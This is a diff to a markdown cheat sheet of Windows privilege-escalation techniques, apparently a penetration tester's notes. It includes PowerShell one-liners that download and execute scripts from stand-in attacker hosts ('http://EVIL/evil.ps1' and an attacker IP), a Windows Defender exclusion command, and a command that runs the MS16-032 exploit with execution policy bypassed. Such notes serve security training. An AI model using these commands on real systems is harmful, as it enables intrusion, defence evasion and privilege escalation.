@@ -150,6 +150,9 @@ echo "IEX (New-Object Net.Webclient).downloadstring('http://EVIL/evil.ps1')"
 //get rid of single quotes and pipe it - ippsec bastard video 23:10
 echo IEX (New-Object Net.Webclient).downloadstring('http://EVIL/evil.ps1') | powershell -noprofile -
 ```
+* Links
+	* [Kali to Windows](https://blog.ropnop.com/transferring-files-from-kali-to-windows/)
+	* [15 ways to download a file](https://blog.netspi.com/15-ways-to-download-a-file/)
 
 [Back](#summary)
 
@@ -300,6 +303,11 @@ qwinsta
 	$PSVersionTable
 	$PSVersionTable.PSVersion
 	```
+	* Download Powersploit
+	```
+	IEX(New-Object Net.WebClient).downloadString('http://10.10.MY.IP/Powersploit/PowerUp.ps1')
+	Invoke-AllChecks
+	```
 	* [Powersploit](https://github.com/PowerShellMafia/PowerSploit)
 		* Get-GPPPassword
 		* Get-UnattendedInstallFile
@@ -310,7 +318,7 @@ qwinsta
 		* Get-RegistryAutoLogon
 	* Run exploit
 	```
-	C:\tmp>powershell -ExecutionPolicy ByPass -command "& { . C:\tmp\Invoke-MS16-032.ps1; Invoke-MS16-032 }"
+	powershell -ExecutionPolicy ByPass -command "& { . C:\tmp\Invoke-MS16-032.ps1; Invoke-MS16-032 }"
 	```
 - Processes Running as system
 	* ***Do not gloss over! IMPORTANT***
@@ -445,10 +453,11 @@ C:\>powershell -exec bypass - "Add-MpPreference -ExclusionPath 'D:\EvilFolder\To
 
 ## Resources
 * [CHECKLIST](https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md)
-* [Reverse Shell](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
-)
+* [Reverse Shell](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)
 * [Spreadsheet with Resources](https://docs.google.com/spreadsheets/d/12bT8APhWsL-P8mBtWCYu4MLftwG1cPmIL25AEBtXDno/edit#gid=2075148101)
 * [Walkthrough](https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/)
+* [Alt Walkthrough](https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/)
+* [Useful Commands for Tools](https://github.com/frizb/Windows-Privilege-Escalation)
 
 [Back](#summary)
 
